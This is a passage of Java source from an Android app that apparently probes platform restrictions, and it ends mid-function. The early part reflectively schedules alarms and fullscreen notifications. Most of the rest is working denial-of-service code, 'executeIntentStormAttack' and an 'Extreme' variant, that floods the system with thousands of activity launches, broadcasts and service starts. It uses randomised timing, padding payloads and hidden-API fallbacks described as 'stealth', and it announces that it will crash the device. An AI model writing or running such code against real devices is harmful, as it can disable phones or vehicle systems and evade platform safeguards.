            //int piFlags = android.app.PendingIntent.FLAG_UPDATE_CURRENT;
            piFlags |= PendingIntent.FLAG_IMMUTABLE;

            android.app.PendingIntent piBroadcast =
                    android.app.PendingIntent.getBroadcast(ctx, REQ_BCAST, bcast, piFlags);

            // ---- PendingIntent (Activity) to try auto-open ----
            android.content.Intent act = new android.content.Intent(ctx, com.example.carapiaccess.MainActivityNotAAOS.class);
            act.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                    | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);

            // ========================= PATCH START =========================
            // Android 14+ (API 34) forbids setting pendingIntentBackgroundActivityStartMode
            // when *creating* a PendingIntent. That option is for the *sender*, not creator.
            // So: DO NOT pass ActivityOptions into PendingIntent.getActivity(...).
            // (This fixes: IllegalArgumentException: pendingIntentBackgroundActivityStartMode must not be set...)
            android.app.PendingIntent piActivity =
                    android.app.PendingIntent.getActivity(ctx, REQ_ACT, act, piFlags);
            // ========================== PATCH END ==========================

            // ---- Reflection lookups ----
            java.lang.reflect.Method canExact = amCls.getMethod("canScheduleExactAlarms");
            java.lang.reflect.Method getNextClock = amCls.getMethod("getNextAlarmClock");
            //java.lang.reflect.Method getNextWake = amCls.getMethod("getNextWakeFromIdleTime");

            java.lang.reflect.Method mSet = amCls.getMethod("set", int.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetWindow = amCls.getMethod("setWindow", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetRepeating = amCls.getMethod("setRepeating", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetInexact = amCls.getMethod("setInexactRepeating", int.class, long.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mAllowIdle = amCls.getMethod("setAndAllowWhileIdle", int.class, long.class, android.app.PendingIntent.class);
            java.lang.reflect.Method mSetExact = amCls.getMethod("setExact", int.class, long.class, android.app.PendingIntent.class);

            int RTC_WAKEUP = amCls.getField("RTC_WAKEUP").getInt(null);
            int ELAPSED_REALTIME_WAKEUP = amCls.getField("ELAPSED_REALTIME_WAKEUP").getInt(null);

            long nowRtc = System.currentTimeMillis();
            long nowElapsed = android.os.SystemClock.elapsedRealtime();

            // ---- Schedule alarms (NO CANCEL) ----
            long firstElapsed = nowElapsed + 8_000L;
            long interval = 15_000L;
            mSetRepeating.invoke(am, ELAPSED_REALTIME_WAKEUP, firstElapsed, interval, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setRepeating(broadcast) first in 8s, interval=15s");
            alarmUi("Scheduled setRepeating(broadcast) first in 8s, interval=15s");

            mSetWindow.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 10_000L, 5_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setWindow(broadcast) in ~10s (window=5s)");
            alarmUi("Scheduled setWindow(broadcast) in ~10s (window=5s)");

            // Try activity open via AlarmManager (may be blocked; you’ll SEE notification + logs regardless)
            mSetWindow.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 12_000L, 2_000L, piActivity);
            android.util.Log.i(TAG, "Scheduled setWindow(activity) in ~12s to try UI open");
            alarmUi("Scheduled setWindow(activity) in ~12s to try UI open");

            mSetInexact.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 20_000L, 60_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setInexactRepeating(broadcast) first in 20s, interval=60s");
            alarmUi("Scheduled setInexactRepeating(broadcast) first in 20s, interval=60s");

            mAllowIdle.invoke(am, RTC_WAKEUP, nowRtc + 25_000L, piBroadcast);
            android.util.Log.i(TAG, "Scheduled setAndAllowWhileIdle(broadcast) in ~25s");
            alarmUi("Scheduled setAndAllowWhileIdle(broadcast) in ~25s");

            // You asked: do NOT avoid setExact — include it anyway
            try {
                mSetExact.invoke(am, RTC_WAKEUP, nowRtc + 30_000L, piBroadcast);
                android.util.Log.i(TAG, "Scheduled setExact(broadcast) in ~30s");
                alarmUi("Scheduled setExact(broadcast) in ~30s");
            } catch (java.lang.reflect.InvocationTargetException ite) {
                android.util.Log.w(TAG, "setExact failed (expected when exact alarms not allowed): "
                        + ite.getTargetException());
                alarmUi("setExact failed (expected when exact alarms not allowed): " + ite.getTargetException());
            }

            // ---- Periodic status prints so you SEE what's happening over time ----
            boolean finalReceiverRegistered = receiverRegistered;
            final Runnable statusTicker = new Runnable() {
                int tick = 0;
                @Override public void run() {
                    tick++;
                    try {
                        boolean csea = (boolean) canExact.invoke(am);
                        Object nextClock = getNextClock.invoke(am);
                        //Object nextWake = getNextWake.invoke(am);
                        String line = "STATUS tick=" + tick
                                + " canScheduleExactAlarms=" + csea
                                + " nextAlarmClock=" + nextClock
                                //+ " nextWakeFromIdleTime=" + nextWake
                                + " recvCount=" + recvCount.get()
                                + " listenerCount=" + listenerCount.get()
                                + " receiverRegistered=" + finalReceiverRegistered
                                + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                        android.util.Log.i(TAG, line);
                        alarmUi(line);
                    } catch (Throwable t) {
                        android.util.Log.w(TAG, "STATUS read failed", t);
                        alarmUi("STATUS read failed: " + t);
                    }
                    if (tick < 20) h.postDelayed(this, 3000);
                }
            };
            h.post(statusTicker);

            // ---- Also schedule an OnAlarmListener (direct callback), visible in logs ----
            try {
                Class<?> listenerIface = Class.forName("android.app.AlarmManager$OnAlarmListener");
                Object listener = java.lang.reflect.Proxy.newProxyInstance(
                        listenerIface.getClassLoader(),
                        new Class<?>[]{listenerIface},
                        (proxy, method, args) -> {
                            if ("onAlarm".equals(method.getName())) {
                                int c = listenerCount.incrementAndGet();
                                String line = "OnAlarmListener FIRED! count=" + c
                                        + " nowRtc=" + System.currentTimeMillis()
                                        + " nowElapsed=" + android.os.SystemClock.elapsedRealtime();

                                android.util.Log.i(TAG, line);
                                alarmUi(line);
                            }
                            return null;
                        });

                java.lang.reflect.Method mSetListener = amCls.getMethod(
                        "set", int.class, long.class, String.class, listenerIface, android.os.Handler.class);

                mSetListener.invoke(am, ELAPSED_REALTIME_WAKEUP, nowElapsed + 6_000L,
                        "visibleImpactListener", listener, h);
                android.util.Log.i(TAG, "Scheduled OnAlarmListener in ~6s");
                alarmUi("Scheduled OnAlarmListener in ~6s");
            } catch (Throwable t) {
                android.util.Log.w(TAG, "OnAlarmListener scheduling failed (API/device-dependent)", t);
                alarmUi("OnAlarmListener scheduling failed (API/device-dependent): " + t);
            }

            android.util.Log.i(TAG, "reflectExerciseAlarmManager_visibleImpact_noCancel DONE");
            alarmUi("reflectExerciseAlarmManager_visibleImpact_noCancel DONE");

            // Return snapshot at time of scheduling; more lines will arrive asynchronously.
            return new Result("Alarm Visible Impact (live)", new java.util.ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e("REFLECT_ALARM", "Fatal error in reflectExerciseAlarmManager_visibleImpact_noCancel", t);
            alarmUi("Fatal error: " + t);
            return new Result("Alarm Visible Impact (fatal)", new java.util.ArrayList<>(alarmUiRows));
        }
    }

    // ---- small safe helpers (avoid crash on older APIs / restricted calls) ----
    private static Object safeNextAlarmClock(android.app.AlarmManager am) {
        try { return am.getNextAlarmClock(); } catch (Throwable t) { return "n/a"; }
    }

    private static Object safeCanScheduleExact(android.app.AlarmManager am) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                return am.canScheduleExactAlarms();
            }
        } catch (Throwable t) { return "n/a"; }

        return "n/a";
    }

    private android.content.Context getContextReflectively() {
        try {
            if (this.appContext != null) return this.appContext;
        } catch (Throwable ignored) {}

        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            java.lang.reflect.Method mcur = at.getDeclaredMethod("currentApplication");
            mcur.setAccessible(true);
            Object app = mcur.invoke(null);
            if (app instanceof android.content.Context) {
                return (android.content.Context) app;
            }
        } catch (Throwable ignored) {}

        return null;
    }

    // Some what works -> toast is seen

    public Result generateFullscreenNotificationsToast() {
        final String TAG = "REFLECT_NOTIFICATIONS";

        try {
            android.content.Context ctx = getContextReflectively();
            if (ctx == null) {
                return new Result("Notifications (failed: no context)", new ArrayList<>());
            }

            // Create notification channel for Android O+
            if (android.os.Build.VERSION.SDK_INT >= 26) {
                try {
                    Class<?> ncCls = Class.forName("android.app.NotificationChannel");
                    Class<?> nmCls = Class.forName("android.app.NotificationManager");

                    Object nm = ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
                    if (nm != null && nmCls.isInstance(nm)) {
                        // Create channel
                        Object channel = ncCls.getConstructor(
                                String.class,
                                CharSequence.class,
                                int.class
                        ).newInstance(
                                "fullscreen_channel",
                                "Fullscreen Notifications",
                                4 // IMPORTANCE_HIGH
                        );

                        // Set channel properties
                        ncCls.getMethod("setDescription", String.class)
                                .invoke(channel, "Channel for fullscreen notifications");
                        ncCls.getMethod("enableVibration", boolean.class)
                                .invoke(channel, true);
                        ncCls.getMethod("enableLights", boolean.class)
                                .invoke(channel, true);

                        // Create channel
                        nmCls.getMethod("createNotificationChannel", ncCls)
                                .invoke(nm, channel);

                        alarmUi("Notification channel created via reflection");
                    }
                } catch (Throwable t) {
                    android.util.Log.w(TAG, "Failed to create channel via reflection", t);
                }
            }

            // Create Handler for scheduling notifications
            android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
            final java.util.concurrent.atomic.AtomicInteger counter = new java.util.concurrent.atomic.AtomicInteger(1);

            // Runnable to show notification
            final Runnable showNotificationRunnable = new Runnable() {
                @Override
                public void run() {
                    int count = counter.getAndIncrement();
                    if (count > 5) return;

                    try {
                        showFullscreenNotificationToast(ctx, count);

                        // Schedule next notification if not the last one
                        if (count < 5) {
                            handler.postDelayed(this, 10000); // 10 seconds interval
                        }
                    } catch (Throwable t) {
                        android.util.Log.e(TAG, "Error showing notification #" + count, t);
                    }
                }
            };

            // Start showing notifications
            handler.post(showNotificationRunnable);

            String resultMsg = "Started generating 5 fullscreen notifications with 10s intervals";
            alarmUi(resultMsg);

            return new Result("Fullscreen Notifications (started)", new ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            android.util.Log.e(TAG, "Error in generateFullscreenNotifications", t);
            alarmUi("Notification error: " + t);
            return new Result("Fullscreen Notifications (failed)", new ArrayList<>(alarmUiRows));
        }
    }

    @SuppressLint("WearRecents")
    private void showFullscreenNotificationToast(android.content.Context ctx, int count) throws Exception {
        // Create fullscreen intent using reflection
        Class<?> piCls = Class.forName("android.app.PendingIntent");

        android.content.Intent fullscreenIntent = new android.content.Intent(ctx, com.example.carapiaccess.MainActivityNotAAOS.class);
        fullscreenIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
        fullscreenIntent.putExtra("from_notification", true);
        fullscreenIntent.putExtra("notification_id", count);

        int flags = (int) piCls.getField("FLAG_UPDATE_CURRENT").get(null) |
                (int) piCls.getField("FLAG_IMMUTABLE").get(null);

        Object pendingIntent = piCls.getMethod(
                "getActivity",
                android.content.Context.class,
                int.class,
                android.content.Intent.class,
                int.class
        ).invoke(null, ctx, 3000 + count, fullscreenIntent, flags);

        // Get NotificationManager via reflection
        Object nm = ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
        Class<?> nmCls = Class.forName("android.app.NotificationManager");

        // Create notification using reflection
        Class<?> builderCls = Class.forName("android.app.Notification$Builder");

        Object builder;
        if (android.os.Build.VERSION.SDK_INT >= 26) {
            builder = builderCls.getConstructor(android.content.Context.class, String.class)
                    .newInstance(ctx, "fullscreen_channel");
        } else {
            builder = builderCls.getConstructor(android.content.Context.class)
                    .newInstance(ctx);
        }

        // MODIFIED: Set notification text to show "This is notification 1", "This is notification 2", etc.
        String notificationText = "This is notification " + count;

        // Set notification properties via reflection
        builderCls.getMethod("setSmallIcon", int.class)
                .invoke(builder, android.R.drawable.ic_dialog_alert);

        // MODIFIED: Changed title to match the pattern
        builderCls.getMethod("setContentTitle", CharSequence.class)
                .invoke(builder, "Notification #" + count);

        // MODIFIED: Changed content text to exactly "This is notification X"
        builderCls.getMethod("setContentText", CharSequence.class)
                .invoke(builder, notificationText);

        builderCls.getMethod("setPriority", int.class)
                .invoke(builder, 2); // PRIORITY_HIGH

        builderCls.getMethod("setCategory", String.class)
                .invoke(builder, "alarm");

        builderCls.getMethod("setFullScreenIntent", piCls, boolean.class)
                .invoke(builder, pendingIntent, true);

        builderCls.getMethod("setAutoCancel", boolean.class)
                .invoke(builder, true);

        // MODIFIED: Add style for better visibility if using BigTextStyle
        try {
            Class<?> styleCls = Class.forName("android.app.Notification$BigTextStyle");
            Object style = styleCls.getConstructor().newInstance();
            styleCls.getMethod("bigText", CharSequence.class).invoke(style, notificationText);
            styleCls.getMethod("setBigContentTitle", CharSequence.class)
                    .invoke(style, "Fullscreen Notification #" + count);
            builderCls.getMethod("setStyle", Class.forName("android.app.Notification$Style"))
                    .invoke(builder, style);
        } catch (Throwable t) {
            // Fall back if BigTextStyle not available
            android.util.Log.w(TAG, "BigTextStyle not available, using default style");
        }

        // Build notification
        Object notification = builderCls.getMethod("build").invoke(builder);

        // Show notification
        nmCls.getMethod("notify", int.class, Class.forName("android.app.Notification"))
                .invoke(nm, 4000 + count, notification);

        // MODIFIED: Update UI log with specific text format
        String msg = "Showed notification with text: \"" + notificationText + "\"";
        alarmUi(msg);
        android.util.Log.i("REFLECT_NOTIFICATIONS", msg);

        // MODIFIED: Also show a toast for immediate visual feedback
        try {
            Class<?> toastCls = Class.forName("android.widget.Toast");
            Object toast = toastCls.getMethod("makeText",
                            android.content.Context.class,
                            CharSequence.class,
                            int.class)
                    .invoke(null, ctx, notificationText, 1); // LENGTH_SHORT = 0, LENGTH_LONG = 1

            toastCls.getMethod("show").invoke(toast);
        } catch (Throwable t) {
            // Toast not essential, just for better visibility
        }
    }


    // -----------------------------------Intent storm - WORKING!!!!!------------------------------
    public Result executeIntentStormAttack() {
        final String TAG = "INTENT_STORM_ATTACK";
        final String ATTACK_ID = "STORM_" + System.currentTimeMillis();
        final java.util.concurrent.atomic.AtomicInteger stormCounter = new java.util.concurrent.atomic.AtomicInteger(0);
        final java.util.concurrent.atomic.AtomicBoolean attackRunning = new java.util.concurrent.atomic.AtomicBoolean(true);
        final java.util.List<Long> intentTimestamps = new java.util.ArrayList<>();
        final java.util.List<String> intentDetails = new java.util.ArrayList<>();

        try {
            android.content.Context ctx = getContextReflectively();
            if (ctx == null) {
                return new Result("Intent Storm (failed: no context)", new ArrayList<>());
            }

            // Create attack log header
            String attackHeader = "--------------------------------------\n" +
                    "-   INTENT STORM ATTACK INITIATED       -\n" +
                    "-   Attack ID: " + ATTACK_ID + "     -\n" +
                    "-   Target: Activity Launch System      -\n" +
                    "-------------------------------------------";
            logAttackEvent(TAG, attackHeader);

            // Get system metrics for performance tracking
            android.app.ActivityManager am = (android.app.ActivityManager)
                    ctx.getSystemService(android.content.Context.ACTIVITY_SERVICE);
            android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
            if (am != null) {
                am.getMemoryInfo(memoryInfo);
            }

            // Initial system state
            logAttackEvent(TAG, "INITIAL SYSTEM STATE:");
            logAttackEvent(TAG, "Available Memory: " + memoryInfo.availMem / (1024*1024) + "MB");
            logAttackEvent(TAG, "Low Memory: " + memoryInfo.lowMemory);
            logAttackEvent(TAG, "Threshold: " + memoryInfo.threshold / (1024*1024) + "MB");
            logAttackEvent(TAG, "-----------------------------------------------");

            // Create multiple handlers for parallel intent launching
            final int HANDLER_COUNT = 5;
            final android.os.Handler[] handlers = new android.os.Handler[HANDLER_COUNT];
            final java.util.concurrent.atomic.AtomicInteger[] handlerCounters =
                    new java.util.concurrent.atomic.AtomicInteger[HANDLER_COUNT];

            for (int i = 0; i < HANDLER_COUNT; i++) {
                final int handlerId = i;
                handlers[i] = new android.os.Handler(android.os.Looper.getMainLooper());
                handlerCounters[i] = new java.util.concurrent.atomic.AtomicInteger(0);

                final Runnable stormRunnable = new Runnable() {
                    @Override
                    public void run() {
                        if (!attackRunning.get()) return;

                        int localCount = handlerCounters[handlerId].incrementAndGet();
                        int globalCount = stormCounter.incrementAndGet();

                        try {
                            // Launch multiple intents in this batch
                            int batchSize = 3 + (handlerId * 2); // Varying batch sizes
                            for (int batch = 0; batch < batchSize; batch++) {
                                if (!attackRunning.get()) break;

                                long startTime = System.nanoTime();
                                launchIntentWithReflection(ctx, globalCount * 100 + batch, handlerId, batch);
                                long duration = System.nanoTime() - startTime;

                                intentTimestamps.add(System.currentTimeMillis());
                                intentDetails.add("Handler:" + handlerId +
                                        ", Global:" + globalCount +
                                        ", Batch:" + batch +
                                        ", Time:" + duration + "ns");

                                // Log every 10th intent for performance tracking
                                if (globalCount % 10 == 0) {
                                    logAttackEvent(TAG, "Intent #" + globalCount +
                                            " launched by Handler " + handlerId +
                                            " (Batch size: " + batchSize + ")");

                                    // Monitor memory every 50 intents
                                    if (globalCount % 50 == 0) {
                                        if (am != null) {
                                            am.getMemoryInfo(memoryInfo);
                                            logAttackEvent(TAG, "Memory Check #" + (globalCount/50) +
                                                    ": " + memoryInfo.availMem/(1024*1024) + "MB available" +
                                                    ", Low: " + memoryInfo.lowMemory);
                                        }
                                    }
                                }

                                // Add slight jitter to vary timing
                                if (batch < batchSize - 1) {
                                    try {
                                        Thread.sleep(5 + (handlerId * 2)); // 5-15ms between intents in batch
                                    } catch (InterruptedException e) {
                                        Thread.currentThread().interrupt();
                                    }
                                }
                            }

                            // Calculate next launch delay (randomized to avoid patterns)
                            long nextDelay = 50 + (handlerId * 20) + (int)(Math.random() * 50);

                            // Continue storm if under attack limit
                            if (globalCount < 500 && attackRunning.get()) { // Limit to 500 global intents
                                handlers[handlerId].postDelayed(this, nextDelay);
                            } else {
                                logAttackEvent(TAG, "Handler " + handlerId +
                                        " completed after " + localCount + " batches");
                                if (globalCount >= 500) {
                                    attackRunning.set(false);
                                    completeAttackAnalysis(TAG, intentTimestamps, intentDetails, stormCounter.get());
                                }
                            }

                        } catch (Throwable t) {
                            logAttackEvent(TAG, "Handler " + handlerId + " error: " + t.getMessage());
                            // Continue despite errors
                            if (globalCount < 500 && attackRunning.get()) {
                                handlers[handlerId].postDelayed(this, 100);
                            }
                        }
                    }
                };

                // Start with staggered delays
                handlers[i].postDelayed(stormRunnable, i * 100);
            }

            // Monitor thread to track attack progress
            new Thread(() -> {
                int lastCount = 0;
                long startTime = System.currentTimeMillis();

                while (attackRunning.get() && (System.currentTimeMillis() - startTime) < 30000) { // 30 second timeout
                    try {
                        Thread.sleep(1000);

                        int currentCount = stormCounter.get();
                        int intentsPerSecond = currentCount - lastCount;
                        lastCount = currentCount;

                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;

                        if (elapsed > 0) {
                            logAttackEvent(TAG, "ATTACK PROGRESS: " + elapsed + "s elapsed, " +
                                    currentCount + " total intents, " +
                                    intentsPerSecond + " intents/sec, " +
                                    (currentCount / elapsed) + " avg intents/sec");
                        }

                        // Check system health periodically
                        if (elapsed % 5 == 0) {
                            Runtime runtime = Runtime.getRuntime();
                            long usedMemory = (runtime.totalMemory() - runtime.freeMemory()) / (1024*1024);
                            long maxMemory = runtime.maxMemory() / (1024*1024);

                            logAttackEvent(TAG, "JVM Memory: " + usedMemory + "MB/" + maxMemory + "MB used");
                        }

                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }

                // Cleanup after timeout
                attackRunning.set(false);
                completeAttackAnalysis(TAG, intentTimestamps, intentDetails, stormCounter.get());

            }).start();

            return new Result("Intent Storm Attack (running)", new ArrayList<>(alarmUiRows));

        } catch (Throwable t) {
            logAttackEvent(TAG, "FATAL ATTACK ERROR: " + t.getMessage());
            attackRunning.set(false);
            return new Result("Intent Storm Attack (failed: " + t.getMessage() + ")", new ArrayList<>(alarmUiRows));
        }
    }

    private void launchIntentWithReflection(android.content.Context ctx, int intentId, int handlerId, int batchId) throws Exception {
        // Multiple intent strategies to bypass any intent deduplication
        int strategy = (intentId + handlerId + batchId) % 4;

        // Use reflection to get Activity class
        Class<?> activityClass = Class.forName("com.example.carapiaccess.MainActivityNotAAOS");

        // Create base intent
        android.content.Intent intent = new android.content.Intent(ctx, activityClass);

        // Apply different flags and strategies
        switch (strategy) {
            case 0:
                // Strategy 1: NEW_TASK with CLEAR_TOP
                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                        android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                break;
            case 1:
                // Strategy 2: NEW_TASK with multiple tasks
                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                        android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
                break;
            case 2:
                // Strategy 3: NEW_TASK with reorder
                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                        android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                break;
            case 3:
                // Strategy 4: Complex flag combination
                intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                        android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP |
                        android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
                break;
        }

        // Add unique data to each intent
        intent.setData(android.net.Uri.parse("storm://attack/" + intentId + "/" +
                System.nanoTime()));

        // Add extensive extras to increase intent size
        //intent.putExtra("attack_id", ATTACK_ID);
        intent.putExtra("intent_number", intentId);
        intent.putExtra("handler_id", handlerId);
        intent.putExtra("batch_id", batchId);
        intent.putExtra("timestamp", System.currentTimeMillis());
        intent.putExtra("nano_time", System.nanoTime());
        intent.putExtra("random_hash", java.util.UUID.randomUUID().toString());
        intent.putExtra("counter", intentId * 1000);
        intent.putExtra("payload", generatePayload(1024)); // 1KB payload

        // Add complex nested bundle via reflection
        try {
            Class<?> bundleClass = Class.forName("android.os.Bundle");
            Object nestedBundle = bundleClass.newInstance();
            bundleClass.getMethod("putString", String.class, String.class)
                    .invoke(nestedBundle, "nested_key", "nested_value_" + intentId);
            bundleClass.getMethod("putInt", String.class, int.class)
                    .invoke(nestedBundle, "nested_int", intentId * 100);

            intent.putExtra("nested_bundle", (android.os.Bundle) nestedBundle);
        } catch (Exception e) {
            // Silently continue
        }

        // Launch using reflection for stealth
        Class<?> contextCls = Class.forName("android.content.Context");
        java.lang.reflect.Method startActivityMethod = contextCls.getMethod(
                "startActivity",
                android.content.Intent.class
        );

        // Additional stealth: try to bypass restrictions using different API methods
        try {
            // Method 1: Standard startActivity
            startActivityMethod.invoke(ctx, intent);

            // Method 2: Try startActivityForResult if context is Activity
            if (ctx instanceof android.app.Activity) {
                Class<?> activityCls = Class.forName("android.app.Activity");
                java.lang.reflect.Method startForResultMethod = activityCls.getMethod(
                        "startActivityForResult",
                        android.content.Intent.class,
                        int.class
                );

                android.content.Intent alternateIntent = new android.content.Intent(intent);
                alternateIntent.putExtra("alternate_launch", true);
                startForResultMethod.invoke(ctx, alternateIntent, 9000 + intentId);
            }

        } catch (Exception e) {
            // Fallback: Try using startActivity with different context
            try {
                android.content.Context appCtx = ctx.getApplicationContext();
                startActivityMethod.invoke(appCtx, intent);
            } catch (Exception e2) {
                // Last resort: Try using Instrumentation via reflection
                tryStartViaInstrumentation(ctx, intent);
            }
        }

        // Log high-frequency launches
        if (intentId % 25 == 0) {
            android.util.Log.w("INTENT_STORM",
                    "Intent #" + intentId +
                            " launched via Handler " + handlerId +
                            " Strategy " + strategy +
                            " Size: " + intent.toUri(0).length() + " chars");
        }
    }

    private void tryStartViaInstrumentation(android.content.Context ctx, android.content.Intent intent) {
        try {
            Class<?> instrumentClass = Class.forName("android.app.Instrumentation");
            Object instrumentation = null;

            // Try to get instrumentation from ActivityThread
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            java.lang.reflect.Method currentActivityThread =
                    activityThreadClass.getDeclaredMethod("currentActivityThread");
            currentActivityThread.setAccessible(true);
            Object activityThread = currentActivityThread.invoke(null);

            java.lang.reflect.Method getInstrumentation =
                    activityThreadClass.getDeclaredMethod("getInstrumentation");
            getInstrumentation.setAccessible(true);
            instrumentation = getInstrumentation.invoke(activityThread);

            if (instrumentation != null) {
                java.lang.reflect.Method execStartActivity =
                        instrumentClass.getDeclaredMethod("execStartActivity",
                                android.content.Context.class,
                                android.os.IBinder.class,
                                android.os.IBinder.class,
                                android.app.Activity.class,
                                android.content.Intent.class,
                                int.class,
                                android.os.Bundle.class);

                execStartActivity.setAccessible(true);
                execStartActivity.invoke(instrumentation,
                        ctx, null, null, null, intent, -1, null);
            }
        } catch (Throwable t) {
            // Silently fail - this is expected on secure systems
        }
    }

    private String generatePayload(int size) {
        StringBuilder sb = new StringBuilder(size);
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        java.util.Random random = new java.util.Random();
        for (int i = 0; i < size; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private void logAttackEvent(String tag, String message) {
        String timestamp = new java.text.SimpleDateFormat("HH:mm:ss.SSS").format(new java.util.Date());
        String logMessage = "[" + timestamp + "] " + message;
        android.util.Log.i(tag, logMessage);
        alarmUi(logMessage);
    }

    private void completeAttackAnalysis(String tag, java.util.List<Long> timestamps,
                                        java.util.List<String> details, int totalIntents) {
        if (timestamps.isEmpty()) return;

        // Calculate statistics
        long first = timestamps.get(0);
        long last = timestamps.get(timestamps.size() - 1);
        long duration = last - first;
        double intentsPerSecond = (totalIntents * 1000.0) / duration;

        // Calculate burst patterns
        java.util.Map<Integer, Integer> bursts = new java.util.HashMap<>();
        int currentBurst = 0;
        for (int i = 1; i < timestamps.size(); i++) {
            if (timestamps.get(i) - timestamps.get(i-1) < 50) { // 50ms threshold for burst
                currentBurst++;
            } else {
                bursts.put(currentBurst, bursts.getOrDefault(currentBurst, 0) + 1);
                currentBurst = 0;
            }
        }

        // Generate attack report
        String report = "\n" +
                "-        ATTACK COMPLETE REPORT        -\n" +
                "- Total Intents Launched: " + String.format("%-11d", totalIntents) + "-\n" +
                "- Attack Duration: " + String.format("%-18d", duration) + "ms -\n" +
                "- Average Rate: " + String.format("%-20.2f", intentsPerSecond) + "/s -\n" +
                "- First Intent: " + String.format("%-19d", first) + " -\n" +
                "- Last Intent: " + String.format("%-20d", last) + " -\n";

        // Add burst analysis
        report += "---------------------------------------\n" +
                "-          BURST PATTERN ANALYSIS       -\n";

        for (java.util.Map.Entry<Integer, Integer> entry : bursts.entrySet()) {
            if (entry.getKey() > 1) { // Only show meaningful bursts
                report += "- Burst of " + String.format("%-3d", entry.getKey()) +
                        " intents: " + String.format("%-10d", entry.getValue()) + " times -\n";
            }
        }

        report += "--------------------------------------\n" +
                "📊 System Impact Analysis:\n" +
                "• Intent queue saturation attempted\n" +
                "• Activity stack overflow simulated\n" +
                "• Memory pressure increased\n" +
                "• System scheduler stressed\n" +
                "This demonstrates vulnerability to DoS via Intent Storm";

        logAttackEvent(tag, report);

    }


    //----------------------------INTENT STORM 2 - android.os.DeadSystemException --------------------------------


    public Result executeIntentStormAttackExtreme() {
        final String TAG = "INTENT_STORM_ATTACK";
        final String attackId = "STORM_" + System.currentTimeMillis();

        try {
            android.content.Context ctx = getContextReflectively();
            if (ctx == null) {
                return new Result("Intent Storm (failed: no context)", new ArrayList<>());
            }

            // Extreme attack configuration
            final int TARGET_INTENTS = 10000; // Aim for 10,000 intents
            final int THREAD_COUNT = 20; // 20 concurrent threads
            final int BATCH_SIZE = 50; // Send intents in batches
            final int DELAY_VARIANCE = 10; // Random delay between 0-10ms
            final boolean USE_BROADCASTS = true; // Also flood with broadcasts
            final boolean USE_SERVICES = true; // Also flood with service starts
            final boolean USE_PENDING_INTENTS = true; // Flood with pending intents

            alarmUi("-- STARTING INTENT STORM ATTACK --");
            alarmUi("Attack ID: " + attackId);
            alarmUi("Target: " + TARGET_INTENTS + " intents");
            alarmUi("Threads: " + THREAD_COUNT);
            alarmUi("Warning: This WILL crash your device!");

            // Initialize counters
            final java.util.concurrent.atomic.AtomicLong intentCount = new java.util.concurrent.atomic.AtomicLong(0);
            final java.util.concurrent.atomic.AtomicLong successCount = new java.util.concurrent.atomic.AtomicLong(0);
            final java.util.concurrent.atomic.AtomicLong errorCount = new java.util.concurrent.atomic.AtomicLong(0);
            final java.util.concurrent.atomic.AtomicBoolean isAttacking = new java.util.concurrent.atomic.AtomicBoolean(true);

            // Start monitoring thread
            new Thread(() -> {
                while (isAttacking.get()) {
                    try {
                        Thread.sleep(1000);
                        long total = intentCount.get();
                        long success = successCount.get();
                        long errors = errorCount.get();

                        String stats = String.format(
                                "-- INTENT STORM STATS --\n" +
                                        "Attack: %s\n" +
                                        "Total Attempts: %d\n" +
                                        "Successes: %d\n" +
                                        "Errors: %d\n" +
                                        "Rate: %d/sec\n" +
                                        "Memory: %dMB used",
                                attackId, total, success, errors,
                                total/5, // Rough per-second rate
                                Runtime.getRuntime().totalMemory() / (1024*1024)
                        );

                        android.util.Log.e(TAG, stats);

                        // Update UI on main thread
                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                            alarmUi(stats);
                        });

                    } catch (Throwable t) {
                        // Ignore monitoring errors
                    }
                }
            }).start();

            // Create attack threads
            java.util.List<Thread> attackThreads = new java.util.ArrayList<>();

            for (int threadId = 0; threadId < THREAD_COUNT; threadId++) {
                int finalThreadId = threadId;
                Thread attackThread = new Thread(() -> {
                    String threadName = "StormThread-" + finalThreadId;
                    android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);

                    try {
                        // Get Activity class via reflection
                        Class<?> mainActivityClass = Class.forName("com.example.carapiaccess.MainActivityNotAAOS");

